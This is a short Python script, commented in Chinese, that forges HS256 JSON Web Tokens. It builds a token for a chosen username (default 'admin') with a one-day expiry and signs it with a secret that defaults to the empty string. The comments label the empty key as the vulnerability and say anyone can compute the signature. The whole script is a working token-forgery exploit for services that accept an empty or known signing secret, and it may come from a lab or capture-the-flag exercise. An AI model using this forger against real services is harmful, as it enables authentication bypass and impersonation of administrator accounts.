import argparse
import base64
import hashlib
import hmac
import json
import time


def b64(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def forge(username: str, secret: str, ttl: int) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"username": username, "exp": int(time.time()) + ttl}

    head = b64(json.dumps(header, separators=(",", ":")).encode())
    body = b64(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{head}.{body}"

    sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{b64(sig)}"


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--user", default="admin", help="要冒充的用户名（默认 admin）")
    ap.add_argument("--secret", default="", help="签名密钥（默认空字符串 = 漏洞点）")
    ap.add_argument("--ttl", type=int, default=86400, help="有效期秒数（默认 1 天）")
    args = ap.parse_args()

    token = forge(args.user, args.secret, args.ttl)
    print(token)
    head, body, sig = token.split(".")
    for name, seg in (("header", head), ("payload", body)):
        pad = "=" * (-len(seg) % 4)
        decoded = base64.urlsafe_b64decode(seg + pad).decode(errors="replace")
        print(f"#   {name:9s} = {decoded}")
    print(f"#   signature = {sig}")
    print(f"#               （= HMAC-SHA256(header.payload, secret={args.secret!r})，"
          "空密钥时任何人都能算出这个值）")


if __name__ == "__main__":
    main()
